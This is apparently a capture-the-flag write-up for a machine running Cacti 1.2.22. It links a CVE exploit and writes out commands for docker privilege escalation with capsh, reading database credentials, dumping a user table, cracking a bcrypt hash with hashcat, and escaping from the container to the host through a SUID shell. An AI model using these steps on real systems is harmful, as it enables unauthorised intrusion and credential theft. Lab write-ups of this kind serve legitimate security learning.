
# The http server uses cacti 1.2.22 which has [CVE](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)  

# the machine runs on docker, which has a privesc /sbin/capsh

```shell
/sbin/capsh --gid=0 --uid=0 --
```
# found mysql credentials on /var/www/html/include/config.php

```shell
/var/www/html/include/config.php:#$rdatabase_password = 'cactiuser';
/var/www/html/include/config.php:$database_password = 'root';
/var/www/html/lib/database.php:					$password = $value;
/var/www/html/lib/database.php:		$password = $database_password;

```

# found ssh credentials
```shell
mysql -h db -u root -proot cacti -e 'select * from user_auth;'
```
# cracked the password using hashcat
```shell
marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

```shell
hashcat -m 3200 -a 0 pass.txt /usr/share/wordlists/rockyou.txt --show
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey

```

# Privesc CVE, did not work 
https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/

# The machine hosted on docker is mounted from the host machine, found it using mount command



> Created SUID file on /tmp using the root user on docker 

```shell
cd /tmp
touch sh
chmod 4777 sh 
<docker-machine-path>/tmp/sh -p

```


> gained root access on the host machine
